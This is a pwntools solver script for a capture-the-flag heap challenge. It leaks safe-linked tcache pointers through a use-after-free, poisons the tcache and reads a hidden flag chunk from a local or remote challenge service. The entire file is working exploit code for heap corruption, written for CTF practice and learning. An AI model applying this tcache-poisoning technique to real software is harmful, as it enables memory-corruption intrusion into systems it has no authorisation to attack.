#!/usr/bin/env python3
"""
House of Water — pwntools solver.

Modes:
    python3 solve_localhost.py
        Run the local ./chal directly.

    python3 solve_localhost.py REMOTE=127.0.0.1:1337
        Connect to the Docker/socat service on localhost.

    python3 solve_localhost.py REMOTE=HOST:PORT
        Connect to the CTF server.

Optional:
    BIN=./chal
    FLAG_OFFSET=0x2a0

The exploit uses the UAF read/write primitive to leak safe-linked tcache
pointers and then poison the tcache to return the hidden flag chunk.
"""

from pwn import *
import os

context.arch = "amd64"
context.log_level = "info"

# ---------------------------------------------------------------------------
# Configuration
# ---------------------------------------------------------------------------

BIN_PATH = str(args.BIN) if args.BIN else "./chal"

# The supplied challenge layout places the flag's user data at:
#     heap_base + 0x2a0
# Keep this configurable so the challenge can be rebuilt/tested in another
# libc environment without editing the exploit.
FLAG_USER_OFFSET = int(str(args.FLAG_OFFSET), 0) if args.FLAG_OFFSET else 0x2a0

if args.REMOTE:
    # rsplit() also handles a hostname containing ':' poorly for IPv6, but the
    # intended CTF syntax is HOST:PORT, so this keeps the interface simple.
    host, port = str(args.REMOTE).rsplit(":", 1)
    io = remote(host, int(port))
    log.info(f"Connected to {host}:{port}")
else:
    if not os.path.isfile(BIN_PATH):
        log.error(
            f"{BIN_PATH} not found. Either place chal in the current directory "
            "or use BIN=/path/to/chal."
        )
    context.binary = BIN_PATH
    io = process(BIN_PATH)
    log.info(f"Running local binary: {BIN_PATH}")

# ---------------------------------------------------------------------------
# Menu helpers
# ---------------------------------------------------------------------------

def do_malloc(idx, size):
    io.sendlineafter(b"> ", b"1")
    io.sendlineafter(b"Index: ", str(idx).encode())
    io.sendlineafter(b"Size: ", str(size).encode())


def do_free(idx):
    io.sendlineafter(b"> ", b"2")
    io.sendlineafter(b"Index: ", str(idx).encode())


def do_edit(idx, offset, data):
    io.sendlineafter(b"> ", b"3")
    io.sendlineafter(b"Index: ", str(idx).encode())
    io.sendlineafter(b"Offset: ", str(offset).encode())
    io.sendlineafter(b"Length: ", str(len(data)).encode())
    io.sendafter(f"Data ({len(data)} bytes): ".encode(), data)


def do_show(idx, offset, length):
    io.sendlineafter(b"> ", b"4")
    io.sendlineafter(b"Index: ", str(idx).encode())
    io.sendlineafter(b"Offset: ", str(offset).encode())
    io.sendlineafter(b"Length: ", str(length).encode())

    # chal prints hex bytes, then a blank line, then the menu.
    raw = io.recvuntil(b"\n\n", drop=True)
    text = raw.decode(errors="strict").replace("\n", " ").strip()

    if not text:
        raise RuntimeError("show() returned no data")

    try:
        return bytes.fromhex(text)
    except ValueError as exc:
        log.error(f"Unexpected show() output: {raw!r}")
        raise exc


# ---------------------------------------------------------------------------
# Exploit
# ---------------------------------------------------------------------------

SZ = 0x88
STRIDE = 0x90  # malloc(0x88) -> 0x90-byte chunk including metadata

# 1. Allocate two consecutive chunks and free the first.
do_malloc(0, SZ)
do_malloc(1, SZ)
do_free(0)

# For the only item in the tcache bin:
#     enc0 = (addr0 >> 12) ^ 0
enc0 = u64(do_show(0, 0, 8))
heap_base = enc0 << 12
log.success(f"heap_base = {heap_base:#x}")

# 2. Free the second chunk.
do_free(1)

# Now chunk 1 is the tcache head and contains:
#     enc1 = (addr1 >> 12) ^ addr0
# Because both chunks are on the same 0x1000-byte page:
#     addr1 >> 12 == addr0 >> 12 == enc0
# Therefore:
#     addr0 = enc0 ^ enc1
enc1 = u64(do_show(1, 0, 8))
addr0 = enc0 ^ enc1
addr1 = addr0 + STRIDE

log.success(f"addr0      = {addr0:#x}")
log.success(f"addr1(head)= {addr1:#x}")

# 3. Compute the hidden flag chunk.
flag_user = heap_base + FLAG_USER_OFFSET

# Target the chunk HEADER, not flag_user itself.
# tcache's key clearing writes at target+8. At header+8 this stays inside
# allocator metadata instead of overwriting the flag bytes at +0x10.
poison_target = flag_user - 0x10

log.info(f"flag_user     = {flag_user:#x}")
log.info(f"poison_target = {poison_target:#x}")

# 4. Overwrite chunk 1's safe-linked fd with:
#       (addr1 >> 12) ^ poison_target
encoded_target = (addr1 >> 12) ^ poison_target
do_edit(1, 0, p64(encoded_target))

# 5. Pop chunk 1, then pop the poisoned target.
do_malloc(2, SZ)
do_malloc(3, SZ)

# chunks[3] now points to the fake allocation at the flag chunk header.
# The actual flag string starts 0x10 bytes later.
flag_data = do_show(3, 0x10, 0x40)
flag_str = flag_data.split(b"\x00", 1)[0]

log.success(f"FLAG = {flag_str!r}")

try:
    print(flag_str.decode())
except UnicodeDecodeError:
    print(flag_str.decode(errors="replace"))

if not flag_str.startswith(b"OWASP{"):
    log.warning(
        "The exploit worked mechanically, but the returned data does not "
        "start with OWASP{. Check that the server's flag.txt is the real flag "
        "and that FLAG_OFFSET matches the challenge's libc/heap layout."
    )

io.close()
